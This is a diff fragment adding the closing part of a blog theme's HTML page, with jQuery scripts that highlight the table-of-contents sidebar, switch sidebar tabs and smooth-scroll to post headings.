+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.2" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 1 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    motionMiddleWares.sidebar = function () {
+      var $tocContent = $('.post-toc-content');
+      if (CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    };
+  });
+</script>
+
+
+
+  <script type="text/javascript" src="/js/bootstrap.js"></script>
+
+  
+  
+
+  
+  
+
+</body>
+</html>
